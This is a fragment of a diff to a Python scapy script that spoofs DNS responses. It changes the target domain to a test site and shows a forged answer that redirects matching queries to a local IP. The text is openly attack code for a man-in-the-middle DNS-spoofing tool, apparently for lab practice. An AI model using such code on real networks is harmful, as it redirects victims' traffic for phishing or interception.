@@ -19,7 +19,7 @@ def process_packet(packet):
     scapy_pkt=scapy.IP(packet.get_payload())
     if scapy_pkt.haslayer(scapy.DNSRR):
         qname=scapy_pkt[scapy.DNSQR].qname
-        s="www.vbcvit.com"
+        s="www.vulnweb.com"
         if s.encode() in qname:
             print("[+] Spoofing target")
             answer=scapy.DNSRR(rrname=qname, rdata="192.168.1.8")
